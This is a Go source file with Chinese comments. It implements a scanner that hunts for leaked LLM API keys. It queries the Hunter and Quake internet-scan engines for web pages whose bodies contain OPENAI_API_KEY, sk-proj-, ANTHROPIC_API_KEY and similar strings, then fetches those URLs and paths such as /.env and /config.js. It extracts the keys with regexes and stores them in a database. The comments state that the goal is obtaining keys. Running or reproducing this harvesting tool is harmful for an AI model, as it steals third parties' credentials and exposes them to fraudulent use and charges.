package llmhunt

import (
	"context"
	"fmt"
	"net/url"
	"strings"
	"time"
)

// 泄漏文件狩猎：不猜路径，直接问空间测绘"哪些 URL 的响应体里有 key"。
//
// 这是"以拿 key 为目的"重排后的主路径。此前是"先找大模型实例、再猜它的配置路径"，
// 命中率取决于猜得准不准；而空间测绘的 body 索引已经告诉了我们"这个 URL 的响应里
// 就含 OPENAI_API_KEY"，剩下的只是把它取回来。
//
// 边界仍然守住：每个 URL 只发 1 次 GET，遇到 403/429 立刻放弃，全局并发受限。

const (
	leakPerQuery  = 10
	leakGap       = 2 * time.Second
	leakMaxURL    = 40
	leakBodyLimit = 512 * 1024
)

// leakQuery 是一条"找泄漏"的查询。
type leakQuery struct {
	query string
	// 用来记录来源，方便界面上区分
	label string
}

// hunterLeakQueries 走 Hunter：它返回的是**具体 URL**，最贴用。
var hunterLeakQueries = []leakQuery{
	{`web.body="OPENAI_API_KEY"`, "OpenAI key 赋值"},
	{`web.body="sk-proj-"`, "OpenAI 新式 key"},
	{`web.body="ANTHROPIC_API_KEY"`, "Anthropic key 赋值"},
	{`web.body="DEEPSEEK_API_KEY"`, "DeepSeek key 赋值"},
	{`web.body="ZHIPUAI_API_KEY"`, "智谱 GLM key 赋值"},
}

// quakeLeakQueries 走 Quake：返回 ip:port，需要再试常见配置路径。
var quakeLeakQueries = []leakQuery{
	{`body="OPENAI_API_KEY"`, "OpenAI key 赋值"},
	{`body="ANTHROPIC_API_KEY"`, "Anthropic key 赋值"},
}

// leakConfigPaths 是 Quake 命中后值得一试的配置路径（每台最多 4 个）。
var leakConfigPaths = []string{"/.env", "/config.js", "/env.js", "/assets/config.json"}

// huntLeaks 跑一轮泄漏文件狩猎，返回 (抓取数, 新增 key 数)。
func (s *Scanner) huntLeaks(ctx context.Context) (int, int) {
	k := loadProviderKeys()
	if k.Hunter == "" && k.Quake == "" {
		s.logf("未配置 Hunter/Quake key，跳过泄漏文件狩猎")
		return 0, 0
	}
	fetched, found := 0, 0
	seen := map[string]bool{}

	// ① Hunter：直接拿 URL
	if k.Hunter != "" {
		for _, lq := range hunterLeakQueries {
			if ctx.Err() != nil || fetched >= leakMaxURL {
				return fetched, found
			}
			urls := hunterLeakURLs(ctx, k.Hunter, lq.query, leakPerQuery)
			for _, u := range urls {
				if ctx.Err() != nil || fetched >= leakMaxURL {
					return fetched, found
				}
				if seen[u] {
					continue
				}
				seen[u] = true
				fetched++
				time.Sleep(leakGap)
				st, body, _ := s.get(ctx, u, leakBodyLimit)
				if st != 200 || body == "" {
					continue
				}
				found += s.extractKeysFrom(u, body, "leak-url")
			}
		}
	}

	// ② Quake：只有 ip:port，补试几个配置路径
	if k.Quake != "" && fetched < leakMaxURL {
		for _, lq := range quakeLeakQueries {
			if ctx.Err() != nil || fetched >= leakMaxURL {
				return fetched, found
			}
			for _, hp := range quakeSearch(ctx, k.Quake, lq.query, leakPerQuery) {
				for _, p := range leakConfigPaths {
					if ctx.Err() != nil || fetched >= leakMaxURL {
						return fetched, found
					}
					u := fmt.Sprintf("http://%s:%d%s", hp.host, hp.port, p)
					if seen[u] {
						continue
					}
					seen[u] = true
					fetched++
					time.Sleep(leakGap)
					st, body, _ := s.get(ctx, u, leakBodyLimit)
					if st != 200 || body == "" {
						continue
					}
					found += s.extractKeysFrom(u, body, "leak-url")
				}
			}
		}
	}
	return fetched, found
}

// hunterLeakURLs 跑一条 Hunter 查询，取出结果里的 URL。
func hunterLeakURLs(ctx context.Context, key, query string, size int) []string {
	pageSize := 10
	if size > 10 {
		pageSize = 20
	}
	search := b64(query)
	u := fmt.Sprintf("https://hunter.qianxin.com/openApi/search?api-key=%s&search=%s&page=1&page_size=%d&is_web=3",
		url.QueryEscape(key), url.QueryEscape(search), pageSize)
	body, err := httpGetJSON(ctx, u, nil)
	if err != nil {
		return nil
	}
	var v struct {
		Code int `json:"code"`
		Data struct {
			Arr []struct {
				URL string `json:"url"`
			} `json:"arr"`
		} `json:"data"`
	}
	if jsonUnmarshal(body, &v) != nil || v.Code != 200 {
		return nil
	}
	var out []string
	for _, a := range v.Data.Arr {
		if strings.HasPrefix(a.URL, "http") {
			out = append(out, a.URL)
			if len(out) >= size {
				break
			}
		}
	}
	return out
}

// extractKeysFrom 从任意 URL 的响应体里提 key，并标来源。
func (s *Scanner) extractKeysFrom(srcURL, body, sourceKind string) int {
	n := 0
	for _, kp := range keyPatterns {
		for _, m := range kp.re.FindAllString(body, 20) {
			if !looksLikeRealKey(m) {
				continue
			}
			if ok, _ := s.pgKeyInsert(srcURL, kp.name, m, sourceKind); ok {
				n++
			}
		}
	}
	if n > 0 {
		s.mu.Lock()
		s.keys += n
		s.mu.Unlock()
	}
	return n
}
